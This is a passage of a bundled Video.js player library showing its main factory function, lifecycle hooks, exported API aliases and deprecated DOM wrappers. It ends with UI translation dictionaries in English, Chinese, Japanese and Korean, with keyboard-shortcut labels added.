 *
 * @event    Player#pluginsetup:$name
 * @type     {Plugin~PluginEventHash}
 */

/**
 * @typedef  {Object} Plugin~PluginEventHash
 *
 * @property {string} instance
 *           For basic plugins, the return value of the plugin function. For
 *           advanced plugins, the plugin instance on which the event is fired.
 *
 * @property {string} name
 *           The name of the plugin.
 *
 * @property {string} plugin
 *           For basic plugins, the plugin function. For advanced plugins, the
 *           plugin class/constructor.
 */

/**
 * @file extend.js
 * @module extend
 */

/**
 * A combination of node inherits and babel's inherits (after transpile).
 * Both work the same but node adds `super_` to the subClass
 * and Bable adds the superClass as __proto__. Both seem useful.
 *
 * @param {Object} subClass
 *        The class to inherit to
 *
 * @param {Object} superClass
 *        The class to inherit from
 *
 * @private
 */
var _inherits = function _inherits(subClass, superClass) {
  if (typeof superClass !== 'function' && superClass !== null) {
    throw new TypeError('Super expression must either be null or a function, not ' + (typeof superClass === 'undefined' ? 'undefined' : _typeof(superClass)));
  }

  subClass.prototype = Object.create(superClass && superClass.prototype, {
    constructor: {
      value: subClass,
      enumerable: false,
      writable: true,
      configurable: true
    }
  });

  if (superClass) {
    // node
    subClass.super_ = superClass;
  }
};

/**
 * Function for subclassing using the same inheritance that
 * videojs uses internally
 *
 * @static
 * @const
 *
 * @param {Object} superClass
 *        The class to inherit from
 *
 * @param {Object} [subClassMethods={}]
 *        The class to inherit to
 *
 * @return {Object}
 *         The new object with subClassMethods that inherited superClass.
 */
var extendFn = function extendFn(superClass) {
  var subClassMethods = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};

  var subClass = function subClass() {
    superClass.apply(this, arguments);
  };

  var methods = {};

  if ((typeof subClassMethods === 'undefined' ? 'undefined' : _typeof(subClassMethods)) === 'object') {
    if (subClassMethods.constructor !== Object.prototype.constructor) {
      subClass = subClassMethods.constructor;
    }
    methods = subClassMethods;
  } else if (typeof subClassMethods === 'function') {
    subClass = subClassMethods;
  }

  _inherits(subClass, superClass);

  // Extend subObj's prototype with functions and other properties from props
  for (var name in methods) {
    if (methods.hasOwnProperty(name)) {
      subClass.prototype[name] = methods[name];
    }
  }

  return subClass;
};

/**
 * @file video.js
 * @module videojs
 */
// Include the built-in techs
// HTML5 Element Shim for IE8
if (typeof HTMLVideoElement === 'undefined' && isReal()) {
  document_1.createElement('video');
  document_1.createElement('audio');
  document_1.createElement('track');
  document_1.createElement('video-js');
}

/**
 * Normalize an `id` value by trimming off a leading `#`
 *
 * @param   {string} id
 *          A string, maybe with a leading `#`.
 *
 * @returns {string}
 *          The string, without any leading `#`.
 */
var normalizeId = function normalizeId(id) {
  return id.indexOf('#') === 0 ? id.slice(1) : id;
};

/**
 * Doubles as the main function for users to create a player instance and also
 * the main library object.
 * The `videojs` function can be used to initialize or retrieve a player.
  *
 * @param {string|Element} id
 *        Video element or video element ID
 *
 * @param {Object} [options]
 *        Optional options object for config/settings
 *
 * @param {Component~ReadyCallback} [ready]
 *        Optional ready callback
 *
 * @return {Player}
 *         A player instance
 */
function videojs(id, options, ready) {
  var player = videojs.getPlayer(id);

  if (player) {
    if (options) {
      log$1.warn('Player "' + id + '" is already initialised. Options will not be applied.');
    }
    if (ready) {
      player.ready(ready);
    }
    return player;
  }

  var el = typeof id === 'string' ? $('#' + normalizeId(id)) : id;

  if (!isEl(el)) {
    throw new TypeError('The element or ID supplied is not valid. (videojs)');
  }

  if (!document_1.body.contains(el)) {
    log$1.warn('The element supplied is not included in the DOM');
  }

  options = options || {};

  videojs.hooks('beforesetup').forEach(function (hookFunction) {
    var opts = hookFunction(el, mergeOptions(options));

    if (!isObject(opts) || Array.isArray(opts)) {
      log$1.error('please return an object in beforesetup hooks');
      return;
    }

    options = mergeOptions(options, opts);
  });

  // We get the current "Player" component here in case an integration has
  // replaced it with a custom player.
  var PlayerComponent = Component.getComponent('Player');

  player = new PlayerComponent(el, options, ready);

  videojs.hooks('setup').forEach(function (hookFunction) {
    return hookFunction(player);
  });

  return player;
}

/**
 * An Object that contains lifecycle hooks as keys which point to an array
 * of functions that are run when a lifecycle is triggered
 */
videojs.hooks_ = {};

/**
 * Get a list of hooks for a specific lifecycle
 * @function videojs.hooks
 *
 * @param {string} type
 *        the lifecyle to get hooks from
 *
 * @param {Function|Function[]} [fn]
 *        Optionally add a hook (or hooks) to the lifecycle that your are getting.
 *
 * @return {Array}
 *         an array of hooks, or an empty array if there are none.
 */
videojs.hooks = function (type, fn) {
  videojs.hooks_[type] = videojs.hooks_[type] || [];
  if (fn) {
    videojs.hooks_[type] = videojs.hooks_[type].concat(fn);
  }
  return videojs.hooks_[type];
};

/**
 * Add a function hook to a specific videojs lifecycle.
 *
 * @param {string} type
 *        the lifecycle to hook the function to.
 *
 * @param {Function|Function[]}
 *        The function or array of functions to attach.
 */
videojs.hook = function (type, fn) {
  videojs.hooks(type, fn);
};

/**
 * Add a function hook that will only run once to a specific videojs lifecycle.
 *
 * @param {string} type
 *        the lifecycle to hook the function to.
 *
 * @param {Function|Function[]}
 *        The function or array of functions to attach.
 */
videojs.hookOnce = function (type, fn) {
  videojs.hooks(type, [].concat(fn).map(function (original) {
    var wrapper = function wrapper() {
      videojs.removeHook(type, wrapper);
      return original.apply(undefined, arguments);
    };

    return wrapper;
  }));
};

/**
 * Remove a hook from a specific videojs lifecycle.
 *
 * @param {string} type
 *        the lifecycle that the function hooked to
 *
 * @param {Function} fn
 *        The hooked function to remove
 *
 * @return {boolean}
 *         The function that was removed or undef
 */
videojs.removeHook = function (type, fn) {
  var index = videojs.hooks(type).indexOf(fn);

  if (index <= -1) {
    return false;
  }

  videojs.hooks_[type] = videojs.hooks_[type].slice();
  videojs.hooks_[type].splice(index, 1);

  return true;
};

// Add default styles
if (window_1.VIDEOJS_NO_DYNAMIC_STYLE !== true && isReal()) {
  var style = $('.vjs-styles-defaults');

  if (!style) {
    style = createStyleElement('vjs-styles-defaults');
    var head = $('head');

    if (head) {
      head.insertBefore(style, head.firstChild);
    }
    setTextContent(style, '\n      .video-js {\n        width: 300px;\n        height: 150px;\n      }\n\n      .vjs-fluid {\n        padding-top: 56.25%\n      }\n    ');
  }
}

// Run Auto-load players
// You have to wait at least once in case this script is loaded after your
// video in the DOM (weird behavior only with minified version)
autoSetupTimeout(1, videojs);

/**
 * Current software version. Follows semver.
 *
 * @type {string}
 */
videojs.VERSION = version;

/**
 * The global options object. These are the settings that take effect
 * if no overrides are specified when the player is created.
 *
 * @type {Object}
 */
videojs.options = Player.prototype.options_;

/**
 * Get an object with the currently created players, keyed by player ID
 *
 * @return {Object}
 *         The created players
 */
videojs.getPlayers = function () {
  return Player.players;
};

/**
 * Get a single player based on an ID or DOM element.
 *
 * This is useful if you want to check if an element or ID has an associated
 * Video.js player, but not create one if it doesn't.
 *
 * @param   {string|Element} id
 *          An HTML element - `<video>`, `<audio>`, or `<video-js>` -
 *          or a string matching the `id` of such an element.
 *
 * @returns {Player|undefined}
 *          A player instance or `undefined` if there is no player instance
 *          matching the argument.
 */
videojs.getPlayer = function (id) {
  var players = Player.players;
  var tag = void 0;

  if (typeof id === 'string') {
    var nId = normalizeId(id);
    var player = players[nId];

    if (player) {
      return player;
    }

    tag = $('#' + nId);
  } else {
    tag = id;
  }

  if (isEl(tag)) {
    var _tag = tag,
        _player = _tag.player,
        playerId = _tag.playerId;

    // Element may have a `player` property referring to an already created
    // player instance. If so, return that.

    if (_player || players[playerId]) {
      return _player || players[playerId];
    }
  }
};

/**
 * Returns an array of all current players.
 *
 * @return {Array}
 *         An array of all players. The array will be in the order that
 *         `Object.keys` provides, which could potentially vary between
 *         JavaScript engines.
 *
 */
videojs.getAllPlayers = function () {
  return (

    // Disposed players leave a key with a `null` value, so we need to make sure
    // we filter those out.
    Object.keys(Player.players).map(function (k) {
      return Player.players[k];
    }).filter(Boolean)
  );
};

/**
 * Expose players object.
 *
 * @memberOf videojs
 * @property {Object} players
 */
videojs.players = Player.players;

/**
 * Get a component class object by name
 *
 * @borrows Component.getComponent as videojs.getComponent
 */
videojs.getComponent = Component.getComponent;

/**
 * Register a component so it can referred to by name. Used when adding to other
 * components, either through addChild `component.addChild('myComponent')` or through
 * default children options  `{ children: ['myComponent'] }`.
 *
 * > NOTE: You could also just initialize the component before adding.
 * `component.addChild(new MyComponent());`
 *
 * @param {string} name
 *        The class name of the component
 *
 * @param {Component} comp
 *        The component class
 *
 * @return {Component}
 *         The newly registered component
 */
videojs.registerComponent = function (name$$1, comp) {
  if (Tech.isTech(comp)) {
    log$1.warn('The ' + name$$1 + ' tech was registered as a component. It should instead be registered using videojs.registerTech(name, tech)');
  }

  Component.registerComponent.call(Component, name$$1, comp);
};

/**
 * Get a Tech class object by name
 *
 * @borrows Tech.getTech as videojs.getTech
 */
videojs.getTech = Tech.getTech;

/**
 * Register a Tech so it can referred to by name.
 * This is used in the tech order for the player.
 *
 * @borrows Tech.registerTech as videojs.registerTech
 */
videojs.registerTech = Tech.registerTech;

/**
 * Register a middleware to a source type.
 *
 * @param {String} type A string representing a MIME type.
 * @param {function(player):object} middleware A middleware factory that takes a player.
 */
videojs.use = use;

/**
 * An object that can be returned by a middleware to signify
 * that the middleware is being terminated.
 *
 * @type {object}
 * @memberOf {videojs}
 * @property {object} middleware.TERMINATOR
 */
// Object.defineProperty is not available in IE8
if (!IS_IE8 && Object.defineProperty) {
  Object.defineProperty(videojs, 'middleware', {
    value: {},
    writeable: false,
    enumerable: true
  });

  Object.defineProperty(videojs.middleware, 'TERMINATOR', {
    value: TERMINATOR,
    writeable: false,
    enumerable: true
  });
} else {
  videojs.middleware = { TERMINATOR: TERMINATOR };
}

/**
 * A suite of browser and device tests from {@link browser}.
 *
 * @type {Object}
 * @private
 */
videojs.browser = browser;

/**
 * Whether or not the browser supports touch events. Included for backward
 * compatibility with 4.x, but deprecated. Use `videojs.browser.TOUCH_ENABLED`
 * instead going forward.
 *
 * @deprecated since version 5.0
 * @type {boolean}
 */
videojs.TOUCH_ENABLED = TOUCH_ENABLED;

/**
 * Subclass an existing class
 * Mimics ES6 subclassing with the `extend` keyword
 *
 * @borrows extend:extendFn as videojs.extend
 */
videojs.extend = extendFn;

/**
 * Merge two options objects recursively
 * Performs a deep merge like lodash.merge but **only merges plain objects**
 * (not arrays, elements, anything else)
 * Other values will be copied directly from the second object.
 *
 * @borrows merge-options:mergeOptions as videojs.mergeOptions
 */
videojs.mergeOptions = mergeOptions;

/**
 * Change the context (this) of a function
 *
 * > NOTE: as of v5.0 we require an ES5 shim, so you should use the native
 * `function() {}.bind(newContext);` instead of this.
 *
 * @borrows fn:bind as videojs.bind
 */
videojs.bind = bind;

/**
 * Register a Video.js plugin.
 *
 * @borrows plugin:registerPlugin as videojs.registerPlugin
 * @method registerPlugin
 *
 * @param  {string} name
 *         The name of the plugin to be registered. Must be a string and
 *         must not match an existing plugin or a method on the `Player`
 *         prototype.
 *
 * @param  {Function} plugin
 *         A sub-class of `Plugin` or a function for basic plugins.
 *
 * @return {Function}
 *         For advanced plugins, a factory function for that plugin. For
 *         basic plugins, a wrapper function that initializes the plugin.
 */
videojs.registerPlugin = Plugin.registerPlugin;

/**
 * Deprecated method to register a plugin with Video.js
 *
 * @deprecated
 *        videojs.plugin() is deprecated; use videojs.registerPlugin() instead
 *
 * @param {string} name
 *        The plugin name
 *
 * @param {Plugin|Function} plugin
 *         The plugin sub-class or function
 */
videojs.plugin = function (name$$1, plugin) {
  log$1.warn('videojs.plugin() is deprecated; use videojs.registerPlugin() instead');
  return Plugin.registerPlugin(name$$1, plugin);
};

/**
 * Gets an object containing multiple Video.js plugins.
 *
 * @param  {Array} [names]
 *         If provided, should be an array of plugin names. Defaults to _all_
 *         plugin names.
 *
 * @return {Object|undefined}
 *         An object containing plugin(s) associated with their name(s) or
 *         `undefined` if no matching plugins exist).
 */
videojs.getPlugins = Plugin.getPlugins;

/**
 * Gets a plugin by name if it exists.
 *
 * @param  {string} name
 *         The name of a plugin.
 *
 * @return {Function|undefined}
 *         The plugin (or `undefined`).
 */
videojs.getPlugin = Plugin.getPlugin;

/**
 * Gets a plugin's version, if available
 *
 * @param  {string} name
 *         The name of a plugin.
 *
 * @return {string}
 *         The plugin's version or an empty string.
 */
videojs.getPluginVersion = Plugin.getPluginVersion;

/**
 * Adding languages so that they're available to all players.
 * Example: `videojs.addLanguage('es', { 'Hello': 'Hola' });`
 *
 * @param {string} code
 *        The language code or dictionary property
 *
 * @param {Object} data
 *        The data values to be translated
 *
 * @return {Object}
 *         The resulting language dictionary object
 */
videojs.addLanguage = function (code, data) {
  var _mergeOptions;

  code = ('' + code).toLowerCase();

  videojs.options.languages = mergeOptions(videojs.options.languages, (_mergeOptions = {}, _mergeOptions[code] = data, _mergeOptions));

  return videojs.options.languages[code];
};

/**
 * Log messages
 *
 * @borrows log:log as videojs.log
 */
videojs.log = log$1;

/**
 * Creates an emulated TimeRange object.
 *
 * @borrows time-ranges:createTimeRanges as videojs.createTimeRange
 */
/**
 * @borrows time-ranges:createTimeRanges as videojs.createTimeRanges
 */
videojs.createTimeRange = videojs.createTimeRanges = createTimeRanges;

/**
 * Format seconds as a time string, H:MM:SS or M:SS
 * Supplying a guide (in seconds) will force a number of leading zeros
 * to cover the length of the guide
 *
 * @borrows format-time:formatTime as videojs.formatTime
 */
videojs.formatTime = formatTime;

/**
 * Replaces format-time with a custom implementation, to be used in place of the default.
 *
 * @borrows format-time:setFormatTime as videojs.setFormatTime
 *
 * @method setFormatTime
 *
 * @param {Function} customFn
 *        A custom format-time function which will be called with the current time and guide (in seconds) as arguments.
 *        Passed fn should return a string.
 */
videojs.setFormatTime = setFormatTime;

/**
 * Resets format-time to the default implementation.
 *
 * @borrows format-time:resetFormatTime as videojs.resetFormatTime
 *
 * @method resetFormatTime
 */
videojs.resetFormatTime = resetFormatTime;

/**
 * Resolve and parse the elements of a URL
 *
 * @borrows url:parseUrl as videojs.parseUrl
 *
 */
videojs.parseUrl = parseUrl;

/**
 * Returns whether the url passed is a cross domain request or not.
 *
 * @borrows url:isCrossOrigin as videojs.isCrossOrigin
 */
videojs.isCrossOrigin = isCrossOrigin;

/**
 * Event target class.
 *
 * @borrows EventTarget as videojs.EventTarget
 */
videojs.EventTarget = EventTarget;

/**
 * Add an event listener to element
 * It stores the handler function in a separate cache object
 * and adds a generic handler to the element's event,
 * along with a unique id (guid) to the element.
 *
 * @borrows events:on as videojs.on
 */
videojs.on = on;

/**
 * Trigger a listener only once for an event
 *
 * @borrows events:one as videojs.one
 */
videojs.one = one;

/**
 * Removes event listeners from an element
 *
 * @borrows events:off as videojs.off
 */
videojs.off = off;

/**
 * Trigger an event for an element
 *
 * @borrows events:trigger as videojs.trigger
 */
videojs.trigger = trigger;

/**
 * A cross-browser XMLHttpRequest wrapper. Here's a simple example:
 *
 * @param {Object} options
 *        settings for the request.
 *
 * @return {XMLHttpRequest|XDomainRequest}
 *         The request object.
 *
 * @see https://github.com/Raynos/xhr
 */
videojs.xhr = xhr;

/**
 * TextTrack class
 *
 * @borrows TextTrack as videojs.TextTrack
 */
videojs.TextTrack = TextTrack;

/**
 * export the AudioTrack class so that source handlers can create
 * AudioTracks and then add them to the players AudioTrackList
 *
 * @borrows AudioTrack as videojs.AudioTrack
 */
videojs.AudioTrack = AudioTrack;

/**
 * export the VideoTrack class so that source handlers can create
 * VideoTracks and then add them to the players VideoTrackList
 *
 * @borrows VideoTrack as videojs.VideoTrack
 */
videojs.VideoTrack = VideoTrack;

/**
 * Determines, via duck typing, whether or not a value is a DOM element.
 *
 * @borrows dom:isEl as videojs.isEl
 * @deprecated Use videojs.dom.isEl() instead
 */

/**
 * Determines, via duck typing, whether or not a value is a text node.
 *
 * @borrows dom:isTextNode as videojs.isTextNode
 * @deprecated Use videojs.dom.isTextNode() instead
 */

/**
 * Creates an element and applies properties.
 *
 * @borrows dom:createEl as videojs.createEl
 * @deprecated Use videojs.dom.createEl() instead
 */

/**
 * Check if an element has a CSS class
 *
 * @borrows dom:hasElClass as videojs.hasClass
 * @deprecated Use videojs.dom.hasClass() instead
 */

/**
 * Add a CSS class name to an element
 *
 * @borrows dom:addElClass as videojs.addClass
 * @deprecated Use videojs.dom.addClass() instead
 */

/**
 * Remove a CSS class name from an element
 *
 * @borrows dom:removeElClass as videojs.removeClass
 * @deprecated Use videojs.dom.removeClass() instead
 */

/**
 * Adds or removes a CSS class name on an element depending on an optional
 * condition or the presence/absence of the class name.
 *
 * @borrows dom:toggleElClass as videojs.toggleClass
 * @deprecated Use videojs.dom.toggleClass() instead
 */

/**
 * Apply attributes to an HTML element.
 *
 * @borrows dom:setElAttributes as videojs.setAttribute
 * @deprecated Use videojs.dom.setAttributes() instead
 */

/**
 * Get an element's attribute values, as defined on the HTML tag
 * Attributes are not the same as properties. They're defined on the tag
 * or with setAttribute (which shouldn't be used with HTML)
 * This will return true or false for boolean attributes.
 *
 * @borrows dom:getElAttributes as videojs.getAttributes
 * @deprecated Use videojs.dom.getAttributes() instead
 */

/**
 * Empties the contents of an element.
 *
 * @borrows dom:emptyEl as videojs.emptyEl
 * @deprecated Use videojs.dom.emptyEl() instead
 */

/**
 * Normalizes and appends content to an element.
 *
 * The content for an element can be passed in multiple types and
 * combinations, whose behavior is as follows:
 *
 * - String
 *   Normalized into a text node.
 *
 * - Element, TextNode
 *   Passed through.
 *
 * - Array
 *   A one-dimensional array of strings, elements, nodes, or functions (which
 *   return single strings, elements, or nodes).
 *
 * - Function
 *   If the sole argument, is expected to produce a string, element,
 *   node, or array.
 *
 * @borrows dom:appendContents as videojs.appendContet
 * @deprecated Use videojs.dom.appendContent() instead
 */

/**
 * Normalizes and inserts content into an element; this is identical to
 * `appendContent()`, except it empties the element first.
 *
 * The content for an element can be passed in multiple types and
 * combinations, whose behavior is as follows:
 *
 * - String
 *   Normalized into a text node.
 *
 * - Element, TextNode
 *   Passed through.
 *
 * - Array
 *   A one-dimensional array of strings, elements, nodes, or functions (which
 *   return single strings, elements, or nodes).
 *
 * - Function
 *   If the sole argument, is expected to produce a string, element,
 *   node, or array.
 *
 * @borrows dom:insertContent as videojs.insertContent
 * @deprecated Use videojs.dom.insertContent() instead
 */
['isEl', 'isTextNode', 'createEl', 'hasClass', 'addClass', 'removeClass', 'toggleClass', 'setAttributes', 'getAttributes', 'emptyEl', 'appendContent', 'insertContent'].forEach(function (k) {
  videojs[k] = function () {
    log$1.warn('videojs.' + k + '() is deprecated; use videojs.dom.' + k + '() instead');
    return Dom[k].apply(null, arguments);
  };
});

/**
 * A safe getComputedStyle with an IE8 fallback.
 *
 * This is because in Firefox, if the player is loaded in an iframe with `display:none`,
 * then `getComputedStyle` returns `null`, so, we do a null-check to make sure
 * that the player doesn't break in these cases.
 * See https://bugzilla.mozilla.org/show_bug.cgi?id=548397 for more details.
 *
 * @borrows computed-style:computedStyle as videojs.computedStyle
 */
videojs.computedStyle = computedStyle;

/**
 * Export the Dom utilities for use in external plugins
 * and Tech's
 */
videojs.dom = Dom;

/**
 * Export the Url utilities for use in external plugins
 * and Tech's
 */
videojs.url = Url;

return videojs;

})));

videojs.addLanguage("en",{
"Note": "Add Note...<key>N</key>",
"Forward": "Forward<key>⌘</key>+<key>→</key>",
"Backward": "Backward<key>⌘</key>+<key>←</key>",
 "Audio Player": "Audio Player",
 "Video Player": "Video Player",
 "Play": "Play/Pause<key>Space</key>",
 "Pause": "Play/Pause<key>Space</key>",
 "Replay": "Replay",
 "Current Time": "Current Time",
 "Duration Time": "Duration Time",
 "Remaining Time": "Remaining Time",
 "Stream Type": "Stream Type",
 "LIVE": "LIVE",
 "Loaded": "Loaded",
 "Progress": "Progress",
 "Progress Bar": "Progress Bar",
 "progress bar timing: currentTime={1} duration={2}": "{1} of {2}",
 "Fullscreen": "Fullscreen",
 "Non-Fullscreen": "Non-Fullscreen",
 "Loop": "Loop",
 "Mute": "Mute",
 "Unmute": "Unmute",
 "Playback Rate": "Playback Rate",
 "Subtitles": "Subtitles",
 "subtitles off": "subtitles off",
 "Captions": "Captions",
 "captions off": "captions off",
 "Chapters": "Chapters",
 "Descriptions": "Descriptions",
 "descriptions off": "descriptions off",
 "Audio Track": "Audio Track",
 "Volume Level": "Volume Level",
 "You aborted the media playback": "You aborted the media playback",
 "A network error caused the media download to fail part-way.": "A network error caused the media download to fail part-way.",
 "The media could not be loaded, either because the server or network failed or because the format is not supported.": "The media could not be loaded, either because the server or network failed or because the format is not supported.",
 "The media playback was aborted due to a corruption problem or because the media used features your browser did not support.": "The media playback was aborted due to a corruption problem or because the media used features your browser did not support.",
 "No compatible source was found for this media.": "No compatible source was found for this media.",
 "The media is encrypted and we do not have the keys to decrypt it.": "The media is encrypted and we do not have the keys to decrypt it.",
 "Play Video": "Play Video",
 "Close": "Close",
 "Close Modal Dialog": "Close Modal Dialog",
 "Modal Window": "Modal Window",
 "This is a modal window": "This is a modal window",
 "This modal can be closed by pressing the Escape key or activating the close button.": "This modal can be closed by pressing the Escape key or activating the close button.",
 ", opens captions settings dialog": ", opens captions settings dialog",
 ", opens subtitles settings dialog": ", opens subtitles settings dialog",
 ", opens descriptions settings dialog": ", opens descriptions settings dialog",
 ", selected": ", selected",
 "captions settings": "captions settings",
 "subtitles settings": "subititles settings",
 "descriptions settings": "descriptions settings",
 "Text": "Text",
 "White": "White",
 "Black": "Black",
 "Red": "Red",
 "Green": "Green",
 "Blue": "Blue",
 "Yellow": "Yellow",
 "Magenta": "Magenta",
 "Cyan": "Cyan",
 "Background": "Background",
 "Window": "Window",
 "Transparent": "Transparent",
 "Semi-Transparent": "Semi-Transparent",
 "Opaque": "Opaque",
 "Font Size": "Font Size",
 "Text Edge Style": "Text Edge Style",
 "None": "None",
 "Raised": "Raised",
 "Depressed": "Depressed",
 "Uniform": "Uniform",
 "Dropshadow": "Dropshadow",
 "Font Family": "Font Family",
 "Proportional Sans-Serif": "Proportional Sans-Serif",
 "Monospace Sans-Serif": "Monospace Sans-Serif",
 "Proportional Serif": "Proportional Serif",
 "Monospace Serif": "Monospace Serif",
 "Casual": "Casual",
 "Script": "Script",
 "Small Caps": "Small Caps",
 "Reset": "Reset",
 "restore all settings to the default values": "restore all settings to the default values",
 "Done": "Done",
 "Caption Settings Dialog": "Caption Settings Dialog",
 "Beginning of dialog window. Escape will cancel and close the window.": "Beginning of dialog window. Escape will cancel and close the window.",
 "End of dialog window.": "End of dialog window."
});
videojs.addLanguage("zh_TW",{
"Note": "新增筆記...<key>N</key>",
"Forward": "快進 5 秒<key>⌘</key>+<key>→</key>",
"Backward": "倒退 5 秒<key>⌘</key>+<key>←</key>",
 "Play": "播放/暫停<key>Space</key>",
 "Pause": "播放/暫停<key>Space</key>",
 "Current Time": "目前時間",
 "Duration Time": "總共時間",
 "Remaining Time": "剩餘時間",
 "Stream Type": "串流類型",
 "LIVE": "直播",
 "Loaded": "載入完畢",
 "Progress": "進度",
 "Fullscreen": "全螢幕",
 "Non-Fullscreen": "退出全螢幕",
 "Loop": "重複播放",
 "Mute": "靜音",
 "Unmute": "取消靜音",
 "Playback Rate": " 播放速率",
 "Subtitles": "字幕",
 "subtitles off": "關閉字幕",
 "Captions": "內嵌字幕",
 "captions off": "關閉內嵌字幕",
 "Chapters": "章節",
 "Close Modal Dialog": "關閉對話框",
 "Descriptions": "描述",
 "descriptions off": "關閉描述",
 "Audio Track": "音軌",
 "You aborted the media playback": "影片播放已終止",
 "A network error caused the media download to fail part-way.": "網路錯誤導致影片下載失敗。",
 "The media could not be loaded, either because the server or network failed or because the format is not supported.": "影片因格式不支援或者伺服器或網路的問題無法載入。",
 "The media playback was aborted due to a corruption problem or because the media used features your browser did not support.": "由於影片檔案損毀或是該影片使用了您的瀏覽器不支援的功能，播放終止。",
 "No compatible source was found for this media.": "無法找到相容此影片的來源。",
 "The media is encrypted and we do not have the keys to decrypt it.": "影片已加密，無法解密。",
 "Play Video": "播放影片",
 "Close": "關閉",
 "Modal Window": "對話框",
 "This is a modal window": "這是一個對話框",
 "This modal can be closed by pressing the Escape key or activating the close button.": "可以按ESC按鍵或啟用關閉按鈕來關閉此對話框。",
 ", opens captions settings dialog": ", 開啟標題設定對話框",
 ", opens subtitles settings dialog": ", 開啟字幕設定對話框",
 ", opens descriptions settings dialog": ", 開啟描述設定對話框",
 ", selected": ", 選擇"
});
videojs.addLanguage("zh_CN",{
"Note": "添加笔记...<key>N</key>",
"Forward": "快进 5 秒<key>⌘</key>+<key>→</key>",
"Backward": "倒退 5 秒<key>⌘</key>+<key>←</key>",
 "Play": "播放/暂停<key>Space</key>",
 "Pause": "播放/暂停<key>Space</key>",
 "Current Time": "当前时间",
 "Duration Time": "时长",
 "Remaining Time": "剩余时间",
 "Stream Type": "媒体流类型",
 "LIVE": "直播",
 "Loaded": "加载完毕",
 "Progress": "进度",
 "Fullscreen": "全屏",
 "Non-Fullscreen": "退出全屏",
 "Loop": "循环播放",
 "Mute": "静音",
 "Unmute": "取消静音",
 "Playback Rate": "播放速度",
 "Subtitles": "字幕",
 "subtitles off": "关闭字幕",
 "Captions": "内嵌字幕",
 "captions off": "关闭内嵌字幕",
 "Chapters": "节目段落",
 "Close Modal Dialog": "关闭弹窗",
 "Descriptions": "描述",
 "descriptions off": "关闭描述",
 "Audio Track": "音轨",
 "You aborted the media playback": "视频播放被终止",
 "A network error caused the media download to fail part-way.": "网络错误导致视频下载中途失败。",
 "The media could not be loaded, either because the server or network failed or because the format is not supported.": "视频因格式不支持或者服务器或网络的问题无法加载。",
 "The media playback was aborted due to a corruption problem or because the media used features your browser did not support.": "由于视频文件损坏或是该视频使用了你的浏览器不支持的功能，播放终止。",
 "No compatible source was found for this media.": "无法找到此视频兼容的源。",
 "The media is encrypted and we do not have the keys to decrypt it.": "视频已加密，无法解密。",
 "Play Video": "播放视频",
 "Close": "关闭",
 "Modal Window": "弹窗",
 "This is a modal window": "这是一个弹窗",
 "This modal can be closed by pressing the Escape key or activating the close button.": "可以按ESC按键或启用关闭按钮来关闭此弹窗。",
 ", opens captions settings dialog": ", 开启标题设置弹窗",
 ", opens subtitles settings dialog": ", 开启字幕设置弹窗",
 ", opens descriptions settings dialog": ", 开启描述设置弹窗",
 ", selected": ", 选择"
});
videojs.addLanguage("ja_JP",{
    "Note": "メモを追加...<key>N</key>",
    "Forward": "5秒に進む<key>⌘</key>+<key>→</key>",
    "Backward": "5秒に戻る<key>⌘</key>+<key>←</key>",
    "Play": "再生/一時停止<key>Space</key>",
    "Pause": "再生/一時停止<key>Space</key>",
    "Current Time": "現在の時間",
    "Duration Time": "長さ",
    "Remaining Time": "残りの時間",
    "Stream Type": "ストリームの種類",
    "LIVE": "ライブ",
    "Loaded": "ロード済み",
    "Progress": "進行状況",
    "Fullscreen": "フルスクリーン",
    "Non-Fullscreen": "フルスクリーン以外",
    "Loop": "繰り返し",
    "Mute": "ミュート",
    "Unmute": "ミュート解除",
    "Playback Rate": "再生レート",
    "Subtitles": "サブタイトル",
    "subtitles off": "サブタイトル オフ",
    "Captions": "キャプション",
    "captions off": "キャプション オフ",
    "Chapters": "チャプター",
    "Close Modal Dialog": "モーダルダイアログを閉じる",
    "Descriptions": "説明",
    "descriptions off": "説明 オフ",
    "Audio Track": "オーディオトラック",
    "You aborted the media playback": "動画再生を中止しました",
    "A network error caused the media download to fail part-way.": "ネットワーク エラーにより動画のダウンロードが途中で失敗しました",
    "The media could not be loaded, either because the server or network failed or because the format is not supported.": "サーバーまたはネットワークのエラー、またはフォーマットがサポートされていないため、動画をロードできませんでした",
    "The media playback was aborted due to a corruption problem or because the media used features your browser did not support.": "破損の問題、またはお使いのブラウザがサポートしていない機能が動画に使用されていたため、動画の再生が中止されました",
    "No compatible source was found for this media.": "この動画に対して互換性のあるソースが見つかりませんでした",
    "The media is encrypted and we do not have the keys to decrypt it.": "動画が暗号化されており、解除する鍵がありません",
    "Play Video": "ビデオを再生",
    "Close": "閉じる",
    "Modal Window": "モーダルウィンドウ",
    "This is a modal window": "これはモーダルウィンドウです",
    "This modal can be closed by pressing the Escape key or activating the close button.": "エスケープキーを押すか、閉じるボタンを押すことでこのモーダルウィンドウを閉じることができます。",
    ", opens captions settings dialog": "、キャプション設定ダイアログを開く",
    ", opens subtitles settings dialog": "、サブタイトル設定ダイアログを開く",
    ", opens descriptions settings dialog": "、説明設定ダイアログを開く",
    ", selected": "、選択された"
});
videojs.addLanguage("ko_KR",{
"Note": "메모를 추가...<key>N</key>",
  "Forward": "뒤로<key>⌘</key>+<key>→</key>",
"Backward": "앞으로<key>⌘</key>+<key>←</key>",
  "Play": "재생<key>Space</key>",
  "Pause": "일시중지<key>Space</key>",
  "Current Time": "현재 시간",
  "Duration": "지정 기간",
  "Remaining Time": "남은 시간",
  "Stream Type": "스트리밍 유형",
  "LIVE": "라이브",
  "Loaded": "로드됨",
  "Progress": "진행",
  "Fullscreen": "전체 화면",
  "Non-Fullscreen": "전체 화면 해제",
  "Mute": "음소거",
  "Unmute": "음소거 해제",
  "Playback Rate": "재생 비율",
  "Subtitles": "서브타이틀",
  "subtitles off": "서브타이틀 끄기",
  "Captions": "자막",
  "captions off": "자막 끄기",
  "Chapters": "챕터",
  "You aborted the media playback": "비디오 재생을 취소했습니다.",
  "A network error caused the media download to fail part-way.": "네트워크 오류로 인하여 비디오 일부를 다운로드하지 못 했습니다.",
  "The media could not be loaded, either because the server or network failed or because the format is not supported.": "비디오를 로드할 수 없습니다. 서버 혹은 네트워크 오류 때문이거나 지원되지 않는 형식 때문일 수 있습니다.",
  "The media playback was aborted due to a corruption problem or because the media used features your browser did not support.": "비디오 재생이 취소됐습니다. 비디오가 손상되었거나 비디오가 사용하는 기능을 브라우저에서 지원하지 않는 것 같습니다.",
  "No compatible source was found for this media.": "비디오에 호환되지 않는 소스가 있습니다."
});
/*!
* 
